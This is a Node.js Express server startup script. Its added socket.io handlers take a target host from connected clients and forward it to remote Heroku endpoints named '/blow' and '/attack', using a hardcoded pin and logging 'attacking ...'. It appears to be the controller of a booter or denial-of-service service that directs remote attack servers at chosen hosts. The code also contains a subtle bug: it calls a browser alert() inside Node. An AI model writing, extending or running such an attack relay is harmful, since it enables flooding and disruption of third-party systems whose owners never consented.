#!/usr/bin/env node

/**
 * Module dependencies.
 */

var app = require('../app');
var debug = require('debug')('lead-the-operations:server');
var http = require('http');
var Req = require('request');

/**
 * Get port from environment and store in Express.
 */

var port = normalizePort(process.env.PORT || '8000');
app.set('port', port);

/**
 * Create HTTP server.
 */

var server = http.createServer(app);

/**
 * Listen on provided port, on all network interfaces.
 */

server.listen(port);
server.on('error', onError);
server.on('listening', onListening);

/**
 * Normalize a port into a number, string, or false.
 */

function normalizePort(val) {
  var port = parseInt(val, 10);

  if (isNaN(port)) {
    // named pipe
    return val;
  }

  if (port >= 0) {
    // port number
    return port;
  }

  return false;
}

/**
 * Event listener for HTTP server "error" event.
 */

function onError(error) {
  if (error.syscall !== 'listen') {
    throw error;
  }

  var bind = typeof port === 'string'
    ? 'Pipe ' + port
    : 'Port ' + port;

  // handle specific listen errors with friendly messages
  switch (error.code) {
    case 'EACCES':
      console.error(bind + ' requires elevated privileges');
      process.exit(1);
      break;
    case 'EADDRINUSE':
      console.error(bind + ' is already in use');
      process.exit(1);
      break;
    default:
      throw error;
  }
}

/**
 * Event listener for HTTP server "listening" event.
 */

function onListening() {
  var addr = server.address();
  var bind = typeof addr === 'string'
    ? 'pipe ' + addr
    : 'port ' + addr.port;
  debug('Listening on ' + bind);
}


io = require('socket.io')(server);

var servs = [
  'http://127.0.0.1:5000'
];

(function () {
  var n = 0;
  var f = servs.length;
  var pin = '1111991';

var get = function () {
  Req.head({url:servs[n]+'/?hash='+pin},onSuccess);
}
  var onSuccess = function (err,response,body) {
    if (err) return console.log(err);
    console.log(response);
    n++;
    if (n>=f) {}
    else get();
  }

  get();
})();

io.on('connection',function (socket) {
  console.log('user is connected');

  socket.emit('message','hi');

socket.on('brq',function (data) {
  console.log(data);
  var pin = '1111991';
  var server = "https://bb-s.herokuapp.com/blow?hash="+pin;
  Req.post({
    url:server,
    form:{
      host:data.host
    }
  },
    function (err,body) {
      if (err) return console.log(err);
    if(body.body == 'done') alert('تم ارسال');
    });




});

socket.on('swt', function(data) {
  console.log(data);
  console.log('attacking ...');
  sendpost('https://swat-s.herokuapp.com'
  ,{ host:data.host},function (err,body) {
    if (err) return console.log(err);
  if(body.body == 'done') console.log('sent!!');
  });

});





});

function sendpost(server,form,callback) {
  var pin = '1111991';
  var server = server+"/attack/?hash="+pin;
  Req.post({
    url:server,
    form:form
  },
    function (err,body) {
      if (err) return console.log(err);
    console.log(body.body);
    });
}
